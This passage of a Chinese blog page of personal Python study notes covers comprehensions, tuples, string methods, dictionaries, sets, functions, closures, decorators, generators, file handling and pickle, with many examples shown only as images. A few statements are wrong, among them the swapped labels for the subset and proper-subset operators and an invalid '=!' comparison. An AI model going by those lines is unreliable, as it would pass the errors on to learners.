class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><p>列表推导式的<strong>嵌套循环</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#例1</span><br>martrix<br>[[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>], [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>], [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]]<br>flatten=[col <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> martrix <span class="hljs-keyword">for</span> col <span class="hljs-keyword">in</span> row]<br>flatten<br>&gt;&gt;&gt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<br><br><span class="hljs-comment">#例2</span><br>a = [x*y <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>) <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>) ]<br>a<br>&gt;&gt;&gt;[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">12</span>, <span class="hljs-number">16</span>]<br></code></pre></td></tr></table></figure><p>高阶嵌套循环</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230611153138620.png" alt="image-20230611153138620" style="zoom:50%;"><h3 id="6、元组-tuple"><a href="#6、元组-tuple" class="headerlink" title="6、元组 tuple"></a>6、元组 tuple</h3><p>元组不可变，<strong>不能修改自身</strong>。</p><p>元组的声明：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230618195321912.png" alt="image-20230618195321912" style="zoom:50%;"><p>支持查找和切片，不支持修改。</p><p>也支持<strong>迭代</strong>。</p><p>元组的<strong>打包</strong>和<strong>解包</strong>。注意解包是，等式左右两端变量数量相等。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230618195713320.png" alt="image-20230618195713320" style="zoom: 50%;"><h2 id="四、字符串"><a href="#四、字符串" class="headerlink" title="四、字符串"></a>四、字符串</h2><h3 id="1、字符串基本处理"><a href="#1、字符串基本处理" class="headerlink" title="1、字符串基本处理"></a>1、字符串基本处理</h3><p>字符串同样是不可变对象，所有方法都是在原基础上生成新字符串。</p><p>字符串同样<strong>支持切片</strong></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230618210900684.png" alt="image-20230618210900684" style="zoom:50%;"><p>字符串单词处理的一些基本方法</p><table><thead><tr><th>字符串方法</th><th>大致意义</th></tr></thead><tbody><tr><td>x.capitalize()</td><td>使一串单词的首字母大写</td></tr><tr><td>x.casefold()</td><td>使所有单词变为小写（与lower方法略微不同）</td></tr><tr><td>x.title()</td><td>使一串单词中每个单词的手写字母大写</td></tr><tr><td>x.swapcase()</td><td>反转字符串中所有字母的大小写</td></tr><tr><td>x.upper()</td><td>使所有单词大写</td></tr><tr><td>x.lower()</td><td>使所有单词小写</td></tr></tbody></table><img src="https://gitee.com/cht1/Image/raw/master/image-20230618211844698.png" alt="image-20230618211844698" style="zoom: 50%;"><table><thead><tr><th>字符串方法</th><th>大致意义</th></tr></thead><tbody><tr><td>x.center(n,char)</td><td>使字符串居中对其n个字符，空白填充char字符，默认空格</td></tr><tr><td>x.ljust(n,char)</td><td>同上，实现左对齐</td></tr><tr><td>x.rjust(n,char)</td><td>同上，实现右对齐</td></tr><tr><td>s.zfill(n)</td><td>用0填充左侧实现对其n</td></tr></tbody></table><img src="https://gitee.com/cht1/Image/raw/master/image-20230618212424681.png" alt="image-20230618212424681" style="zoom:50%;"><h3 id="2、字符串操作"><a href="#2、字符串操作" class="headerlink" title="2、字符串操作"></a>2、字符串操作</h3><ol><li>查找操作</li></ol><table><thead><tr><th>查找操作</th><th></th></tr></thead><tbody><tr><td>x.count(char,start,end)</td><td>从字符串下标start到end，查找字符char</td></tr><tr><td>x.find(char)</td><td>从左往右查找字符，返回下标，不存在则返回-1</td></tr><tr><td>x.rfind(char)</td><td>从右往左查找</td></tr><tr><td>x.index(char)</td><td>从左往右查找字符，返回首字母下标，不存在则抛出<strong>异常</strong></td></tr></tbody></table><ol start="2"><li>替换操作</li></ol><table><thead><tr><th>替换操作</th><th></th></tr></thead><tbody><tr><td>x.expandtabs(k)</td><td>将字符串中的每个tab字符替换为k个空格。</td></tr><tr><td>x.replace(a,b)</td><td>将x字符串中的a字符串替换为b字符串</td></tr><tr><td>table &#x3D; x.maketrans(a,b)</td><td>返回一个，将等长的字符串a、b一一对应的table表</td></tr><tr><td>str.translate(table)</td><td>用上面的table表，替换str字符串。</td></tr></tbody></table><img src="https://gitee.com/cht1/Image/raw/master/image-20230629214140053.png" alt="image-20230629214140053" style="zoom:50%;"><p><code>x.maketrans(a,b,c)</code>支持第三个参数c，可以将字符串c中的所有字符替换为空None。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230629214854629.png" alt="image-20230629214854629" style="zoom:50%;"><p>一些其他方法</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230629224123104.png" alt="image-20230629224123104" style="zoom: 50%;"><p>等等，太多了，记不完。。</p><ol start="3"><li>关键方法</li></ol><p><code>str.join(s)</code>：遍历字符串str，为每个字符后面添加字符串s，（s若一个列表，则拼接起来）</p><p><code>format()</code>方法，格式化输出字符串</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230629231410611.png" alt="image-20230629231410611" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230629231454779.png" alt="image-20230629231454779" style="zoom:50%;"><p>格式化输出数字：二进制、八进制、十进制</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230629231935943.png" alt="image-20230629231935817" style="zoom:50%;"><p>f字符串</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230707172710250.png" alt="image-20230707172710250" style="zoom:50%;"><h2 id="五、序列"><a href="#五、序列" class="headerlink" title="五、序列"></a>五、序列</h2><h3 id="1、序列基础"><a href="#1、序列基础" class="headerlink" title="1、序列基础"></a>1、序列基础</h3><p>序列分为<strong>可变序列</strong>（列表）和<strong>不可变序列</strong>（元组、字符串）</p><p><code>id()</code>方法，返回一个对象的唯一标识，一个整形的id值。</p><p><strong>基础运算符</strong>：</p><p><code>is</code>和<code>is not</code>判断两个变量是否为同一对象。</p><p><code>in</code>和<code>not in</code>判断一个对象是否包含在另一个对象内</p><h3 id="2、列表、元组、字符串相互转换"><a href="#2、列表、元组、字符串相互转换" class="headerlink" title="2、列表、元组、字符串相互转换"></a>2、列表、元组、字符串相互转换</h3><table><thead><tr><th>列表、元组、字符串相互转换</th><th></th><th>初始化：a列表、b元组、c字符串<br><br><img src="https://gitee.com/cht1/Image/raw/master/image-20230707172752278.png" alt="image-20230707172752278" style="zoom:50%;"></th></tr></thead><tbody><tr><td><strong>可迭代对象</strong>（字符串、元组）<strong>转列表</strong>：</td><td><code>list()</code></td><td>注意：字符串转列表后，依然是单个字符，而非值<br><img src="https://gitee.com/cht1/Image/raw/master/image-20230702164832341.png" alt="image-20230702164832341" style="zoom:50%;"></td></tr><tr><td>可迭代对象<strong>转元组</strong>：</td><td><code>tuple()</code></td><td>注意：字符串转元组后，依然是单个字符<br><img src="https://gitee.com/cht1/Image/raw/master/image-20230702164946947.png" alt="image-20230702164946947" style="zoom:50%;"></td></tr><tr><td>可迭代对象<strong>转字符串</strong>：</td><td><code>str()</code></td><td>注意：连符号也一同转换（列表的框框<code>[]</code>还存在）<br><img src="https://gitee.com/cht1/Image/raw/master/image-20230702165051907.png" alt="image-20230702165051907" style="zoom:50%;"></td></tr></tbody></table><p><strong>基础方法：</strong>参数为可迭代对象。</p><p><code>min()</code>：可设置参数default&#x3D;”“，表示空对象时默认输出。</p><p><code>max()</code>：</p><p><code>len()</code>：</p><p><code>sorted()</code>：注意：该方法参数可以是列表、元组、字符串，但返回的是一个全新的<strong>列表</strong>，原对象并未改变（与列表自带方法<code>x.sort()</code>不同）。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702165930344.png" alt="image-20230702165930344" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230702170551291.png" alt="image-20230702170551291" style="zoom:50%;"><p><code>reversed()</code>：同上，返回结果是一个<code>迭代器</code>，即一个地址，需要用<strong>list</strong>方法（<strong>tuple</strong>方法也可以）显示。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702170646881.png" alt="image-20230702170646881" style="zoom:50%;"><h3 id="3、序列-其他"><a href="#3、序列-其他" class="headerlink" title="3、序列-其他"></a>3、序列-其他</h3><p><code>enumerate()</code>：函数用于返回一个枚举对象，它的功能就是将可迭代对象中的每个元素及从start（默认为0）开始的序号共同构成一个<strong>二元组</strong>的列表。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702171723459.png" alt="image-20230702171723459" style="zoom:50%;"><p><code>zip()</code>：函数用于创建一个聚合多个可迭代对象的<strong>迭代器</strong>（返回）。它会将作为参数传入的<strong>每个可迭代对象的每个元素</strong>依次组合成元组，即第i个元组包含来自每个参数的第i个元素。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702171947542.png" alt="image-20230702171947542" style="zoom:50%;"><p><code>map()</code>：函数会<strong>根据提供的函数</strong>对指定的可迭代对象的每个元素进行运算,并将<strong>返回运算结果的迭代器</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702172552279.png" alt="image-20230702172552279" style="zoom:50%;"><p><code>filter()</code>：函数会<strong>根据提供的函数</strong>对指定的可迭代对象的每个元素进行运算,并<strong>将运算结果为真的元素</strong>,以迭代器的形式返回。</p><p>与<code>map()</code>不同的是，只保留运算结果为真的元素。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702215820917.png" alt="image-20230702215820917" style="zoom:50%;"><h3 id="4、可迭代对象-vs-迭代器"><a href="#4、可迭代对象-vs-迭代器" class="headerlink" title="4、可迭代对象 vs 迭代器"></a>4、可迭代对象 vs 迭代器</h3><p>可迭代对象：列表、元组、字符串这些，可以重复使用</p><p>迭代器：只可使用一次，用完之后则变为空。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702220315013.png" alt="image-20230702220315013" style="zoom:50%;"><p><code>iter()</code>：该方法将一个可迭代对象转换为一个迭代器。</p><p>可以通过<code>next()</code>方法，每次从迭代器中取一个元素，同样包含可选的<code>default</code>参数。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702220616175.png" alt="image-20230702220616175" style="zoom:50%;"><h2 id="六、字典、集合、函数"><a href="#六、字典、集合、函数" class="headerlink" title="六、字典、集合、函数"></a>六、字典、集合、函数</h2><h3 id="1、字典"><a href="#1、字典" class="headerlink" title="1、字典"></a>1、字典</h3><p>字典：python中唯一实现<strong>映射关系</strong>的内置类型。使用方法：x&#x3D;{键:值，键:值，……}</p><p>键不可重复，重复则覆盖原始键对应的值。</p><p>6种字典创建方式：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702223556511.png" alt="image-20230702223556511" style="zoom:50%;"><p><code>fromkeys(iterable[, values])</code>：快速创建一个所有键的值都为value的字典（value默认为None）。</p><p><strong>新增</strong>或<strong>更改</strong>键值对：直接定义即可。</p><p><code>pop(key[, default])</code>：该方法<strong>删除</strong>字典中对应键key。</p><p><code>popitem()</code>，python3.7之前，随机删除一个键值对，python3.7之后，删除最后一个加入列表的键值对。</p><p><code>del</code>关键字，可用于删除字典的指定键，如<code>del d[&quot;i&quot;]</code></p><p><code>d.clear()</code>该方法删除字典<code>d</code>中的所有键值对，使其变为一个空字典。</p><p><code>d.update([other])</code>：<strong>更新</strong>字典，参数为一个字典或者键值对。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702231101806.png" alt="image-20230702231101806" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230702231212915.png" alt="image-20230702231212915" style="zoom:50%;"><p><code>d.get(key[, default])</code>：get方法返回字典d中对应键为key的值。</p><p><code>setdefault(key[, default])</code>：查找并返回字典中key键对应的值，若不存在，则新增键值对key&#x3D;default。</p><p><code>d.items(),d.keys(),d.values()</code>：分别返回字典的键值对、键、值对应的字典视图对象，当字典键值对发生变化是，视图对象全部发生变化。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702232216746.png" alt="image-20230702232216746" style="zoom:50%;"><p>字典的浅拷贝、求字典元素个数、判断是否存在：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702232352639.png" alt="image-20230702232352639" style="zoom:50%;"><p>字典<strong>转列表</strong>：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702232515551.png" alt="image-20230702232515551" style="zoom:50%;"><p>字典也可以<strong>嵌套</strong>，可以嵌套一个字典，也可以嵌套一个序列。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702232757727.png" alt="image-20230702232757727" style="zoom:50%;"><p><strong>字典推导式</strong>，类似于<strong>列表推导式</strong>：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230702233208389.png" alt="image-20230702233208389" style="zoom:50%;"><blockquote><p>d&#x3D;{x:ord(x) for x in “FishC”}#获取字符串对应ascll码的键值对。</p></blockquote><h3 id="2、集合"><a href="#2、集合" class="headerlink" title="2、集合"></a>2、集合</h3><p>集合，与字典类似，意义于数学上定义类似。定义方法为：<code>x=&#123;value_1,value_2,value_3, ...&#125;</code>，数据类型为<code>set</code></p><p>操作方法也与字典类似，<strong>注意</strong>：集合具有<strong>无序性</strong>，即不存在下标。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230707172833345.png" alt="image-20230707172833345" style="zoom:50%;"><p><strong>重点</strong>：集合具有<strong>唯一性</strong>，也就是集合中的元素只会出现一遍。</p><blockquote><p>将具有重复元素的列表转为集合，会去重。</p><p>判断列表s是否具有重复元素：if len(s) &#x3D;! len(set(s))</p></blockquote><p>集合基本判断：子集<code>&lt;</code>、真子集<code>&lt;=</code>、超集<code>&gt;</code>、真超集<code>&gt;=</code>、交集<code>&amp;</code>、并集<code>|</code>、差集<code>-</code>、对称差集<code>^</code>。</p><p>集合分为<strong>可变集合</strong><code>set()</code>与<strong>不可变集合</strong><code>frozenset()</code>。</p><p>可变集合可用<code>update(可迭代对象)</code>方法进行更新（单增），</p><p>使用<code>add(字符串s)</code>，将字符串s作为整体添加到集合；</p><p>用<code>remove(x)</code>方法指定删除元素， 若不存在则报错，而<code>discard(x)</code>方法是静默删除；</p><p>用<code>pop()</code>方法随机删除一个元素，<code>clear()</code>方法将集合清零。</p><p>集合的交集、差集、对称差集方法：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703200041729.png" alt="image-20230703200041729" style="zoom:50%;"><p><code>hash(不可变对象)</code>：获取一个不可变对象（列表为可变对象）的哈希值。</p><p>集合<strong>不可嵌套</strong>，除非初始化为<code>frozenset()</code></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703201506665.png" alt="image-20230703201506665" style="zoom:50%;"><p><strong>重点！！！</strong>：集合的低沉查找为<strong>散列查找</strong>，查找速度快于列表，但是牺牲内存（以空间换时间）。</p><h3 id="3、函数"><a href="#3、函数" class="headerlink" title="3、函数"></a>3、函数</h3><h4 id="（1）函数参数传入方式"><a href="#（1）函数参数传入方式" class="headerlink" title="（1）函数参数传入方式"></a>（1）函数参数传入方式</h4><p>函数的定义：<strong>函数名</strong>、<strong>参数</strong>（形参实参）、<strong>返回值</strong>。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703225546014.png" alt="image-20230703225546014" style="zoom:50%;"><p>上图为<strong>①位置参数</strong>，</p><p><strong>②关键字参数</strong>：调用函数时规定具体形参的传入值，可乱序</p><p>位置参数和关键参数可同时使用，但是位置参数必须在关键字参数之前（后使用关键字参数）。</p><p><strong>③默认参数</strong>：调用时，可不传入参数，则为默认值。定义时，要全部放在后面位置。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703231745980.png" alt="image-20230703231745980" style="zoom:50%;"><p><code>help()</code>方法获取函数的建议使用说明</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703232247935.png" alt="image-20230703232247935" style="zoom:50%;"><p><strong>特殊点</strong>：定义时参数使用<code>*</code>，表示左侧的参数任意方法传入，但右侧参数必须使用关键字参数传入。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230703232516699.png" alt="image-20230703232516699" style="zoom:50%;"><p><strong>④收集参数</strong>：类比于<code>print</code>函数，可以同时接收不确定的多个参数，定义时，形式参数前加上<code>*</code>，如下所示，调用函数时，相当于把参数<strong>全部打包为一个元组</strong>，传入函数。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704220926059.png" alt="image-20230704220926059" style="zoom:50%;"><p>当<strong>同时</strong>写<strong>收集参数</strong>和<strong>位置参数</strong>和<strong>关键字参数</strong>时，必须按照位置参数在前、收集参数其次、关键字参数最后的顺序，才能使函数有序传入参数。如下图：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704222228979.png" alt="image-20230704222228979" style="zoom:50%;"><p>若要<strong>以字典形式</strong>传入多个收集参数，则采用<code>**</code>的形式</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704223005363.png" alt="image-20230704223005363" style="zoom:50%;"><p>若多种方式传入，则以字典形式传入只能放在最后的顺序，传入参数。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704223153752.png" alt="image-20230704223153752" style="zoom:50%;"><p>例如：字符串的<code>format</code>方法，即同时拥有元组形式和字典形式手机参数的函数。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704224844006.png" alt="image-20230704224844006" style="zoom:50%;"><p><strong>⑤解包参数</strong>：指在函数调用时，在<strong>实参</strong>前面加上<code>*</code>，表示将实参<strong>按照元组</strong>解包，依次传入；而在实参前面加上<code>**</code>，表示将实参<strong>按照字典</strong>解包，依次传入。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704225629217.png" alt="image-20230704225629217" style="zoom:50%;"><img src="https://gitee.com/cht1/Image/raw/master/image-20230704225646293.png" alt="image-20230704225646293" style="zoom:50%;"><h4 id="（2）作用域"><a href="#（2）作用域" class="headerlink" title="（2）作用域"></a>（2）作用域</h4><p>作用域主要指：<strong>局部变量</strong>和<strong>全局变量</strong></p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704233138295.png" alt="image-20230704233138295" style="zoom:50%;"><p><strong>global语句</strong>：在函数内部，使用全局变量时，相当于在函数内部创建了一个<strong>同名局部变量</strong>，并不会修改外部全局变量的值。若要修改，可以使用**<code>global</code>**关键字，明确表示修改外部全局变量。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704233602276.png" alt="image-20230704233602276" style="zoom:50%;"><p><strong>函数嵌套</strong>：如下图，函数<code>funA</code>嵌套函数<code>funB</code>，在函数<code>funA</code>外部，无法调用函数<code>funB</code>。</p><blockquote><p>嵌套函数是<strong>闭包</strong>和<strong>装饰器</strong>的基础</p></blockquote><img src="https://gitee.com/cht1/Image/raw/master/image-20230704233852865.png" alt="image-20230704233852865" style="zoom:50%;"><p><strong>nonlocal语句</strong>：允许<strong>嵌套函数</strong>使用<strong>外部函数的局部变量</strong>，且允许修改。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230704234301568.png" alt="image-20230704234301568" style="zoom:50%;"><p><strong>LEGB规则</strong>：表示作用域优先级，由高到低。</p><blockquote><p>Local：局部作用域；</p><p>Enclosed：嵌套函数的外层作用域， </p><p>Global：全局作用域， </p><p>Build-in：内置作用域。 </p></blockquote><h4 id="（3）函数闭包"><a href="#（3）函数闭包" class="headerlink" title="（3）函数闭包"></a>（3）函数闭包</h4><p>将嵌套函数作为函数的范围值（函数的返回值为函数）。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230707172920179.png" alt="image-20230707172920179" style="zoom:50%;"><p>如上图，在嵌套函数内部访问外层函数变量，再返回内部嵌套函数并调用，则成为<strong>闭包</strong>。调用函数<code>funA</code>时，返回函数<code>funB</code>，此时<code>funB</code>内部的<code>x</code>值类似于仅对于<code>funB</code>的<strong>静态变量</strong>（C语言），生命周期变长，随程序结束而结束。如下图：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705222708975.png" alt="image-20230705222708975" style="zoom:50%;"><p>闭包常用于控制变量访问。</p><h4 id="（4）装饰器"><a href="#（4）装饰器" class="headerlink" title="（4）装饰器"></a>（4）装饰器</h4><p>添加<strong>装饰器</strong>的函数，再调用函数时，相当于先将函数当作参数传入装饰器，再调用起返回值。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705225335050.png" alt="image-20230705225335050" style="zoom:50%;"><p><strong>多个装饰器</strong>，则<strong>从下往上</strong>，依次调用。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705225701835.png" alt="image-20230705225701835" style="zoom:50%;"><p><strong>进阶</strong>：给装饰器传参：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705225924214.png" alt="image-20230705225924214" style="zoom:50%;"><h4 id="（5）lambda表达式"><a href="#（5）lambda表达式" class="headerlink" title="（5）lambda表达式"></a>（5）lambda表达式</h4><p><strong>lambda表达式</strong>，类似于C语言里的<code>#define add(x,y) x+y</code>，可以用于简化语句。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705232238945.png" alt="image-20230705232238945" style="zoom:50%;"><p>一些奇怪但不常用的使用方法</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705232352686.png" alt="image-20230705232352686" style="zoom:50%;"><h4 id="（6）生成器：yield表达式"><a href="#（6）生成器：yield表达式" class="headerlink" title="（6）生成器：yield表达式"></a>（6）生成器：yield表达式</h4><p>不同于列表、元组这种可迭代对象（一次性返回所有指），<strong>生成器表达式yeild</strong>使元素一次返回一个（通过<code>next()</code>方法），直到所有返回完。</p><p>如果用于定义的函数内，则使函数变为一个生成器，每次调用，执行一次函数，并返回<code>yield</code>对于变量的值。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705233940019.png" alt="image-20230705233940019" style="zoom:50%;"><p>用<strong>生成器yield</strong>求斐波那契数列</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705234222043.png" alt="image-20230705234222043" style="zoom:50%;"><p>类比<strong>列表推导式</strong>，实现生成器推导式。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230705234553129.png" alt="image-20230705234553129" style="zoom:50%;"><h4 id="（7）函数递归"><a href="#（7）函数递归" class="headerlink" title="（7）函数递归"></a>（7）函数递归</h4><p>在函数内部调用函数自身，称为递归。递归的关键在于：找到<strong>边界条件</strong>，退出递归，返回上一层函数。</p><p><strong>递归的优点</strong>：逻辑简单，代码简洁。</p><ol><li>利用递归，求整数阶乘：</li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230707173009583.png" alt="image-20230707173009583" style="zoom:50%;"><ol start="2"><li><p>利用递归，求斐波那契数列：</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230706221122140.png" alt="image-20230706221122140" style="zoom:50%;"></li><li><p>利用递归，求汉诺塔问题（简单汉诺塔）。</p></li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230706223432180.png" alt="image-20230706223432180" style="zoom:50%;"><p><strong>递归的缺点</strong>：及其消耗内存、消耗时间。（因为每次递归调用，都会新开辟一个函数堆栈。）当数据量过大时，就会导致超时或内存崩溃。</p><p>所以实际开发中，非递归的函数写法虽然显得复杂臃肿，但实际更加稳定可靠。</p><h4 id="（8）函数文档、类型注释、内省"><a href="#（8）函数文档、类型注释、内省" class="headerlink" title="（8）函数文档、类型注释、内省"></a>（8）函数文档、类型注释、内省</h4><ol><li>函数文档 <code>help()</code></li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230706224243041.png" alt="image-20230706224243041" style="zoom:50%;"><p>也可以自己编写函数文档，一定要写在函数开始的位置。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230706224430677.png" alt="image-20230706224430677" style="zoom:50%;"><ol start="2"><li>类型注释</li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230706225340996.png" alt="image-20230706225340996" style="zoom:50%;"><ol start="3"><li>内省</li></ol><p>指程序运行时，能够进行自我检测的机制。类似于默认提供的属性方法。</p><img src="https://gitee.com/cht1/Image/raw/master/image-20230706225831508.png" alt="image-20230706225831508" style="zoom:50%;"><h4 id="（9）高阶函数"><a href="#（9）高阶函数" class="headerlink" title="（9）高阶函数"></a>（9）高阶函数</h4><p>当一个函数接收另一个<strong>函数作为参数</strong>时，则称这个函数为<strong>高阶函数</strong>。</p><blockquote><p>例如装饰器，即为高阶函数</p></blockquote><p>学过的高阶函数：map，filter；（min、max、salty也算高阶，因为有一个key参数接收函数对象）</p><p>python3有一个自带模块<code>functools</code>，提供一些常用高阶函数，例如：</p><ol><li><code>functools.reduce(函数，可迭代[ ,初始化器] )</code>方法，相当于递归的形式，具体如下图。</li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230707222342260.png" alt="image-20230707222342260" style="zoom:50%;"><ol start="2"><li><code>wraps()</code>装饰器：解决<strong>闭包</strong>时，函数名称变化的问题，实际很少有。</li></ol><img src="https://gitee.com/cht1/Image/raw/master/image-20230707223220353.png" alt="image-20230707223220353" style="zoom:50%;"><h2 id="七、文件操作、异常"><a href="#七、文件操作、异常" class="headerlink" title="七、文件操作、异常"></a>七、文件操作、异常</h2><h3 id="1、文件操作"><a href="#1、文件操作" class="headerlink" title="1、文件操作"></a>1、文件操作</h3><h4 id="（1）文件基本操作"><a href="#（1）文件基本操作" class="headerlink" title="（1）文件基本操作"></a>（1）文件基本操作</h4><p>python里文件的基本操作类似于C语言，包括<code>f=open()</code>、<code>f.write()</code>、<code>f.read()</code>、<code>f.tell()</code>、<code>f.seek()</code>等</p><p><strong>注意</strong>：所有文件操作，结束后必须调用<code>f.close()</code>，才会保存到文件里，否则只会在内存里。</p><p>参考：<a href="https://www.runoob.com/python/python-files-io.html">菜鸟教程：文件I&#x2F;O</a></p><hr><blockquote><p>下面摘抄自菜鸟教程</p></blockquote><p>一个文件被打开后，你有一个file对象，你可以得到有关该文件的各种信息。</p><p>以下是和file对象相关的所有属性的列表：</p><table><thead><tr><th align="left">属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">file.closed</td><td align="left">返回true如果文件已被关闭，否则返回false。</td></tr><tr><td align="left">file.mode</td><td align="left">返回被打开文件的访问模式。</td></tr><tr><td align="left">file.name</td><td align="left">返回文件的名称。</td></tr><tr><td align="left">file.softspace</td><td align="left">如果用print输出后，必须跟一个空格符，则返回false。否则返回true。</td></tr></tbody></table><hr><h4 id="（2）路径处理"><a href="#（2）路径处理" class="headerlink" title="（2）路径处理"></a>（2）路径处理</h4><p>有两个库可用于路径处理，旧版为<code>os.path</code>模块，新版为<code>pathlib</code>，函数有很多，用法也挺多，用到再查。。（问GPT）</p><p><code>os.path</code>比较经典实用，<a href="https://www.runoob.com/python/python-os-path.html">Python os.path 模块</a></p><p><code>pathlib</code>，python官方文档中文版：<a href="https://docs.python.org/zh-cn/3/library/pathlib.html#module-pathlib">pathlib — 面向对象的文件系统路径</a></p><h4 id="（3）with语句-上下文管理器"><a href="#（3）with语句-上下文管理器" class="headerlink" title="（3）with语句+上下文管理器"></a>（3）with语句+上下文管理器</h4><p>例如：</p><img src="../../../../../AppData/Roaming/Typora/typora-user-images/image-20230708112400692.png" alt="image-20230708112400692" style="zoom:50%;"><p>使用<strong>上下文管理器</strong>后，则不需要通过<code>f.close()</code>关闭文件句柄，自动的：上文打开文件，下文关闭文件。</p><blockquote><p>优点：利于资源的正确释放</p><p>（当<code>f.close()</code>上方有一条语句报错时，<code>f.close()</code>则不会正常执行，导致资源未正确释放）</p><p>而在<strong>with上下文管理器</strong>中报错，资源依然可以正确释放</p></blockquote><h4 id="（4）pickle序列化"><a href="#（4）pickle序列化" class="headerlink" title="（4）pickle序列化"></a>（4）pickle序列化</h4><p>序列化：把抽象的代码转为二进制数据。</p><p><code>pickle</code>库中的<code>dump()</code>方法和<code>load()</code>方法，分别代表将代码序列化与反序列化</p><p>例如：</p><table><thead><tr><th>pickle.dump() 示例</th><th>生成文件的二进制数据如下</th></tr></thead><tbody><tr><td><img src="https://gitee.com/cht1/Image/raw/master/image-20230708114758491.png" alt="image-20230708114758491" style="zoom:50%;"></td><td><img src="https://gitee.com/cht1/Image/raw/master/image-20230708114859253.png" alt="image-20230708114859253" style="zoom:50%;"></td></tr></tbody></table><table><thead><tr><th>pickle.load() 示例</th><th>读取并打印</th></tr></thead><tbody><tr><td><img src="https://gitee.com/cht1/Image/raw/master/image-20230708115517111.png" alt="image-20230708115517111" style="zoom:50%;"></td><td><img src="https://gitee.com/cht1/Image/raw/master/image-20230708115632602.png" alt="image-20230708115632602" 